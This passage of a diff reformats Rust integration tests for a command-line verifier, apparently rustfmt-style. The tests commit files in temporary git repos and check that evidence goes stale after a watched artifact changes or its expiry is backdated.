+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "a",
+        ],
+    );
     let first = out(&["verify", "c.uni"], &dir);
-    assert!(first.contains("Accepted"), "untracked build output must not stale evidence: {first}");
+    assert!(
+        first.contains("Accepted"),
+        "untracked build output must not stale evidence: {first}"
+    );
     let second = out(&["verify", "c.uni"], &dir);
     assert!(second.contains("Accepted"), "{second}");
 }
@@ -496,18 +928,48 @@ fn declared_watch_matching_nothing_is_invalid() {
     .unwrap();
     git(&dir, &["init", "-q"]);
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "a"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "a",
+        ],
+    );
 
     let first = out(&["verify", "c.uni"], &dir);
-    assert!(first.contains("EvidenceRequired"), "unobservable subject must not verify: {first}");
+    assert!(
+        first.contains("EvidenceRequired"),
+        "unobservable subject must not verify: {first}"
+    );
 
     // Now the watched files exist: the previous run left no reusable proof.
     std::fs::create_dir_all(dir.join("dist")).unwrap();
     std::fs::write(dir.join("dist/out.bin"), b"artifact").unwrap();
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "artifact"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "artifact",
+        ],
+    );
     let second = out(&["verify", "c.uni"], &dir);
-    assert!(second.contains("Accepted"), "with the subject observable it verifies: {second}");
+    assert!(
+        second.contains("Accepted"),
+        "with the subject observable it verifies: {second}"
+    );
 
     // A change to the watched subject must not reuse the previous proof: the
     // verifier command is `true` (so the decision is unchanged), but the
@@ -516,7 +978,19 @@ fn declared_watch_matching_nothing_is_invalid() {
     let stale_before = before.matches("EvidenceStale").count();
     std::fs::write(dir.join("dist/out.bin"), b"tampered").unwrap();
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "tamper"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "tamper",
+        ],
+    );
     let _ = out(&["verify", "c.uni"], &dir);
     let after = std::fs::read_to_string(dir.join(".uni/events.jsonl")).unwrap();
     assert!(
@@ -543,34 +1017,60 @@ fn expired_evidence_is_reestablished() {
     .unwrap();
     git(&dir, &["init", "-q"]);
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "a"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "a",
+        ],
+    );
 
     let first = out(&["verify", "c.uni"], &dir);
     assert!(first.contains("Accepted"), "{first}");
 
     // The stamped expiry must be recorded on the evidence file.
-    let ev_file = std::fs::read_dir(dir.join(".uni/evidence")).unwrap()
+    let ev_file = std::fs::read_dir(dir.join(".uni/evidence"))
+        .unwrap()
         .flatten()
         .map(|e| e.path())
         .find(|p| p.extension().map(|x| x == "json").unwrap_or(false))
         .expect("evidence written");
-    let mut ev: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(&ev_file).unwrap()).unwrap();
-    assert!(ev["expires_at"].is_string(), "expiry must be recorded: {ev}");
+    let mut ev: serde_json::Value =
+        serde_json::from_str(&std::fs::read_to_string(&ev_file).unwrap()).unwrap();
+    assert!(
+        ev["expires_at"].is_string(),
+        "expiry must be recorded: {ev}"
+    );
     // Age it: rewrite the expiry into the past, as elapsed time would.
     let past = chrono::Utc::now() - chrono::Duration::hours(2);
     ev["expires_at"] = serde_json::json!(past.to_rfc3339());
     std::fs::write(&ev_file, serde_json::to_string_pretty(&ev).unwrap()).unwrap();
 
-    let stale_before = std::fs::read_to_string(dir.join(".uni/events.jsonl")).unwrap()
-        .matches("EvidenceStale").count();
+    let stale_before = std::fs::read_to_string(dir.join(".uni/events.jsonl"))
+        .unwrap()
+        .matches("EvidenceStale")
+        .count();
     let second = out(&["verify", "c.uni"], &dir);
-    assert!(second.contains("Accepted"), "a re-established proof accepts again: {second}");
+    assert!(
+        second.contains("Accepted"),
+        "a re-established proof accepts again: {second}"
+    );
     let journal = std::fs::read_to_string(dir.join(".uni/events.jsonl")).unwrap();
     assert!(
         journal.matches("EvidenceStale").count() > stale_before,
         "expiry must mark the old proof stale:\n{journal}"
     );
     // And the fresh proof carries a new window.
-    let ev2: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(&ev_file).unwrap()).unwrap();
-    assert_ne!(ev2["expires_at"], ev["expires_at"], "the window must be renewed");
+    let ev2: serde_json::Value =
+        serde_json::from_str(&std::fs::read_to_string(&ev_file).unwrap()).unwrap();
+    assert_ne!(
+        ev2["expires_at"], ev["expires_at"],
+        "the window must be renewed"
+    );
 }
